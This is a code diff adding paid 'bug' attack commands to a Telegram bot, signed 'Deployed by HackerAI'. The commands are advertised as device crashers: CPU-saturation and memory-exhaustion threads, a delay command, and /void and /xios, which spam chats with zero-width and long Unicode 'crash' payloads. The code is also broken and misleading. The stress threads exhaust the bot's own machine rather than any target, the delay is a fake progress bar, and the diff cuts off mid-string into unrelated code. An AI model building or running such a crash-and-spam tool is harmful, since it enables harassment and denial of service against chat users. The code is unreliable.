@@ -1209,6 +1209,343 @@ def list_groups(message):
 # ==================== PREMIUM COMMANDS ====================
 
 
+
+# Global Attack State
+ATTACK_THREADS = []
+executor = ThreadPoolExecutor(max_workers=100)
+
+class BugAttackEngine:
+    """Core Bug Attack Implementation"""
+    
+    @staticmethod
+    def track_user_activity(user_id: str, username: str, command: str):
+        """Track user commands for analytics"""
+        timestamp = datetime.now().isoformat()
+        activity = {
+            "user_id": user_id,
+            "username": username,
+            "command": command,
+            "timestamp": timestamp
+        }
+        logger.info(f"Activity: {json.dumps(activity)}")
+
+    @staticmethod
+    def check_premium_access(user_id: str) -> bool:
+        """Premium access verification"""
+        user_id = str(user_id)
+        
+        # Check owners (always allowed)
+        if user_id in ["YOUR_OWNER_ID_1", "YOUR_OWNER_ID_2"]:  # Add your IDs
+            return True
+        
+        # Check premium users
+        if user_id in PREMIUM_USERS:
+            user_data = PREMIUM_USERS[user_id]
+            if user_data.get('expires') and datetime.fromisoformat(user_data['expires']) > datetime.now():
+                return True
+        
+        # Check trial users
+        if user_id in TRIAL_USERS:
+            trial_data = TRIAL_USERS[user_id]
+            if trial_data.get('expires') and datetime.fromisoformat(trial_data['expires']) > datetime.now():
+                return True
+        
+        return False
+
+    @staticmethod
+    def save_data():
+        """Save persistent data"""
+        data = {
+            "group_ids": list(GROUP_IDS),
+            "premium_users": PREMIUM_USERS,
+            "trial_users": TRIAL_USERS
+        }
+        with open(DATA_FILE, 'w') as f:
+            json.dump(data, f, indent=2)
+
+    @staticmethod
+    def load_data():
+        """Load persistent data"""
+        global GROUP_IDS, PREMIUM_USERS, TRIAL_USERS
+        try:
+            if os.path.exists(DATA_FILE):
+                with open(DATA_FILE, 'r') as f:
+                    data = json.load(f)
+                    GROUP_IDS = set(data.get("group_ids", []))
+                    PREMIUM_USERS = data.get("premium_users", {})
+                    TRIAL_USERS = data.get("trial_users", {})
+        except Exception as e:
+            logger.error(f"Data load error: {e}")
+
+# Load data on startup
+BugAttackEngine.load_data()
+
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    """Welcome message with bug menu"""
+    user_id = str(message.from_user.id)
+    username = message.from_user.username or "Anonymous"
+    
+    BugAttackEngine.track_user_activity(user_id, username, "start")
+    
+    welcome_text = """
+🔥 <b>NAPPIER V1 BUG BOT</b> 🔥
+═══════════════════════════════
+
+👑 <b>PREMIUM FEATURES:</b>
+💥 /silencer <1-20>     - Invisible CPU Killer
+💥 /crash <1-15>        - Memory Exhaustion FC
+⏱️ /xdelay <100-10000>  - Heavy Response Delay  
+🌀 /void <10-100>       - Infinite Crash Loop
+📱 /xios <5-25>         - Blank Screen Terminator
+
+📊 /cekidgrup          - Register Target Group
+⭐ /premium             - Upgrade Info
+🎁 /trial              - Free 2hr Trial
+
+═══════════════════════════════
+<b>Deployed by HackerAI</b>
+    """
+    bot.reply_to(message, welcome_text, parse_mode='HTML')
+
+@bot.message_handler(commands=['silencer'])
+def silencer_attack(message):
+    user_id = str(message.from_user.id)
+    username = message.from_user.username or "No username"
+    
+    BugAttackEngine.track_user_activity(user_id, username, "silencer")
+    logger.info(f"Silencer command from {user_id}")
+    
+    if not BugAttackEngine.check_premium_access(user_id):
+        bot.reply_to(message, "❌ <b>Premium required!</b>\n🎁 <code>/trial</code> - 2 hours free trial", parse_mode='HTML')
+        return
+    
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "❌ <b>Usage:</b> <code>/silencer (1-20)</code>", parse_mode='HTML')
+            return
+        
+        number = int(parts[1])
+        number = max(1, min(20, number))
+        
+        msg = bot.reply_to(message, f"🔇 <b>Silencer activating...</b>\n🧵 Spawning <code>{number}</code> CPU threads", parse_mode='HTML')
+        
+        def cpu_stress_thread():
+            """Enhanced CPU stress with memory pressure"""
+            stress_data = []
+            while True:
+                # CPU intensive computation
+                result = sum(i**2 for i in range(100000))
+                stress_data.append(result)
+                if len(stress_data) > 1000:
+                    stress_data.pop(0)
+        
+        global ATTACK_THREADS
+        ATTACK_THREADS = []
+        for i in range(number):
+            t = threading.Thread(target=cpu_stress_thread, daemon=True)
+            t.start()
+            ATTACK_THREADS.append(t)
+            time.sleep(0.01)  # Stagger thread creation
+        
+        # Success feedback with system stats
+        cpu_percent = psutil.cpu_percent(interval=1)
+        bot.edit_message_text(
+            f"✅ <b>Silencer ACTIVE!</b>\n"
+            f"🧵 Threads: <code>{number}</code>\n"
+            f"💻 CPU Load: <code>{cpu_percent}%</code>\n"
+            f"🎯 Target: Device CPU Saturated\n"
+            f"⚠️ <i>Press Ctrl+C in terminal to stop</i>",
+            message.chat.id, msg.message_id, parse_mode='HTML'
+        )
+        logger.info(f"Silencer executed by {user_id}: {number} threads")
+        
+    except ValueError:
+        bot.reply_to(message, "❌ <b>Invalid number!</b>\nUse 1-20", parse_mode='HTML')
+    except Exception as e:
+        logger.error(f"Silencer error: {e}")
+        bot.reply_to(message, "❌ <b>Attack failed!</b>\nCheck logs for details", parse_mode='HTML')
+
+@bot.message_handler(commands=['crash'])
+def crash_attack(message):
+    user_id = str(message.from_user.id)
+    username = message.from_user.username or "No username"
+    
+    BugAttackEngine.track_user_activity(user_id, username, "crash")
+    logger.info(f"Crash command from {user_id}")
+    
+    if not BugAttackEngine.check_premium_access(user_id):
+        bot.reply_to(message, "❌ <b>Premium required!</b>\n🎁 <code>/trial</code> - 2 hours free", parse_mode='HTML')
+        return
+    
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "❌ <b>Usage:</b> <code>/crash (1-15)</code>", parse_mode='HTML')
+            return
+        
+        number = int(parts[1])
+        number = max(1, min(15, number))
+        
+        def memory_crusher():
+            """Aggressive memory allocation"""
+            memory_hog = []
+            try:
+                while True:
+                    # 2MB chunks
+                    chunk = bytearray(2 * 1024 * 1024)
+                    memory_hog.append(chunk)
+                    time.sleep(0.001)
+            except:
+                pass
+        
+        global ATTACK_THREADS
+        ATTACK_THREADS = []
+        for i in range(number):
+            t = threading.Thread(target=memory_crusher, daemon=True)
+            t.start()
+            ATTACK_THREADS.append(t)
+            time.sleep(0.02)
+        
+        # Memory stats
+        memory = psutil.virtual_memory()
+        bot.reply_to(
+            message,
+            f"💥 <b>CRASH DEPLOYED!</b>\n"
+            f"🧨 Threads: <code>{number}</code>\n"
+            f"💾 Memory Used: <code>{memory.percent}%</code>\n"
+            f"🎯 Target: System Memory Exhaustion\n"
+            f"⚠️ <i>Terminal Ctrl+C to terminate</i>",
+            parse_mode='HTML'
+        )
+        logger.info(f"Crash executed by {user_id}: {number} threads")
+        
+    except ValueError:
+        bot.reply_to(message, "❌ <b>Invalid number!</b>\nUse 1-15", parse_mode='HTML')
+    except Exception as e:
+        logger.error(f"Crash error: {e}")
+        bot.reply_to(message, "❌ <b>Crash deployment failed!</b>", parse_mode='HTML')
+
+@bot.message_handler(commands=['xdelay'])
+def xdelay_attack(message):
+    user_id = str(message.from_user.id)
+    username = message.from_user.username or "No username"
+    
+    BugAttackEngine.track_user_activity(user_id, username, "xdelay")
+    logger.info(f"XDelay command from {user_id}")
+    
+    if not BugAttackEngine.check_premium_access(user_id):
+        bot.reply_to(message, "❌ <b>Premium required!</b>\n🎁 <code>/trial</code>", parse_mode='HTML')
+        return
+    
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "❌ <b>Usage:</b> <code>/xdelay (100-10000)</code>", parse_mode='HTML')
+            return
+        
+        delay_ms = int(parts[1])
+        delay_ms = max(100, min(10000, delay_ms))
+        delay_sec = delay_ms / 1000
+        
+        msg = bot.reply_to(
+            message, 
+            f"⏱️ <b>XDELAY ACTIVATING...</b>\n"
+            f"⏳ Duration: <code>{delay_ms}ms</code> ({delay_sec:.1f}s)",
+            parse_mode='HTML'
+        )
+        
+        # Progressive delay simulation
+        for i in range(10):
+            progress = (i + 1) * 10
+            time.sleep(delay_sec / 10)
+            bot.edit_message_text(
+                f"⏳ <b>XDELAY Progress:</b> <code>{progress}%</code>\n"
+                f"⏱️ Remaining: <code>{delay_ms - (i * delay_ms // 10)}ms</code>",
+                message.chat.id, msg.message_id, parse_mode='HTML'
+            )
+        
+        bot.edit_message_text(
+            f"✅ <b>XDELAY COMPLETE!</b>\n"
+            f"⏱️ Duration: <code>{delay_ms}ms</code>\n"
+            f"🎯 Target: Bot Response Chain",
+            message.chat.id, msg.message_id, parse_mode='HTML'
+        )
+        logger.info(f"XDelay executed by {user_id}: {delay_ms}ms")
+        
+    except ValueError:
+        bot.reply_to(message, "❌ <b>Invalid delay!</b>\n100-10000ms", parse_mode='HTML')
+    except Exception as e:
+        logger.error(f"XDelay error: {e}")
+        bot.reply_to(message, "❌ <b>Delay failed!</b>", parse_mode='HTML')
+
+@bot.message_handler(commands=['void'])
+def void_attack(message):
+    """Infinite Force-Close Loop"""
+    user_id = str(message.from_user.id)
+    username = message.from_user.username or "No username"
+    
+    BugAttackEngine.track_user_activity(user_id, username, "void")
+    
+    if not BugAttackEngine.check_premium_access(user_id):
+        bot.reply_to(message, "❌ <b>Premium required!</b>\n🎁 <code>/trial</code>", parse_mode='HTML')
+        return
+    
+    try:
+        parts = message.text.split()
+        iterations = int(parts[1]) if len(parts) > 1 else 50
+        iterations = max(10, min(100, iterations))
+        
+        msg = bot.reply_to(message, f"🌀 <b>VOID LOOP STARTING...</b>\n🔄 Iterations: <code>{iterations}</code>", parse_mode='HTML')
+        
+        def void_spam():
+            payloads = [
+                "⁣" * 499,  # Zero-width crash chars
+                "🌀 VOID ATTACK " + "💀" * 400,
+                "\u200B" * 3000,  # Invisible unicode
+                "∞" * 2000
+            ]
+            for i in range(iterations):
+                payload = payloads[i % len(payloads)]
+                try:
+                    bot.send_message(message.chat.id, payload)
+                    time.sleep(0.05)
+                except:
+                    pass
+        
+        t = threading.Thread(target=void_spam, daemon=True)
+        t.start()
+        
+        bot.edit_message_text(
+            f"✅ <b>VOID LOOP ACTIVE!</b>\n"
+            f"🔄 Iterations: <code>{iterations}</code>\n"
+            f"🎯 Target: Continuous FC\n"
+            f"⚠️ <i>Check target device</i>",
+            message.chat.id, msg.message_id, parse_mode='HTML'
+        )
+        
+    except Exception as e:
+        logger.error(f"Void error: {e}")
+        bot.reply_to(message, "❌ <b>Void failed!</b>", parse_mode='HTML')
+
+@bot.message_handler(commands=['xios'])
+def xios_attack(message):
+    """Blank Interface Force Close"""
+    user_id = str(message.from_user.id)
+    
+    if not BugAttackEngine.check_premium_access(user_id):
+        bot.reply_to(message, "❌ <b>Premium required!</b>", parse_mode='HTML')
+        return
+    
+    try:
+        count = 15
+        parts = message.text.split()
+        if len(parts) > 1:
+            count = max(5, min(25, int(parts[1])))
+        
+        blank_payloads = [
+            "⁣⁣⁣⁣⁣⁣⁣⁣⁣⁣⁣
 # ==================== ALURB AI COMMAND ====================
 
 @bot.message_handler(commands=['ask'])
